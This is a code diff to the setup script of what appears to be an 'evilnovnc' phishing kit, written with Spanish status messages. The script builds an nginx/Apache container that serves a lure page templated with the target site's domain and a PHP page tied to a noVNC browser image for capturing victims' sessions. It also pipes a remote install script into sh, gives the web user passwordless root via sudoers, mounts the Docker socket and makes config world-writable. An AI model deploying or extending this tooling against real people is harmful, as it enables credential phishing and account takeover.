@@ -33,13 +33,17 @@ path=$(pwd)
 printf "\n\e[1;33m[>]Preparando nginx..."
 cd Files
 cp index.php index_tmp.php
+cp index.html index_tmp.html
 id_image=$(sudo docker images evilnovnc -q)
 sed -i'' -e "s,webpage,$WEBPAGE,g" index_tmp.php
 sed -i'' -e "s,idimage,$id_image,g" index_tmp.php
 sed -i'' -e "s,download_string,$path/Downloads,g" index_tmp.php
+#Change this if you have another index.html
+domain=$(echo "$WEBPAGE" | awk -F/ '{print $3}')
+sed -i'' -e "s,_domain_,$domain,g" index_tmp.html
 cd ..
 sudo docker network create nginx-evil 2> /dev/null
-sudo docker run --name evilnginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx:1.23.2
+sudo docker run --name evilnginx --rm  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx:1.23.2
 sudo docker exec -it evilnginx bash -c "apt update && apt install apache2 php7.4 sudo -y"
 sudo docker exec -it evilnginx bash -c "curl -fsSL https://get.docker.com | sh"
 sudo docker exec -it evilnginx bash -c "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
@@ -48,9 +52,10 @@ sudo docker exec -it evilnginx bash -c "chmod 777 /etc/nginx/conf.d/default.conf
 sudo docker exec -it evilnginx bash -c "nginx -s reload"
 sudo docker exec -it evilnginx bash -c "a2enmod php7.4"
 sudo docker exec -it evilnginx bash -c "service apache2 start"
-sudo docker exec -it evilnginx bash -c "cp /data/index.html /usr/share/nginx/html/index.html"
+sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.html /usr/share/nginx/html/index.html"
 sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.php /var/www/html/index.php"
 rm ./Files/index_tmp.php
+rm ./Files/index_tmp.html
 printf "\n\e[1;33m[>]Fin nginx..."
 
 
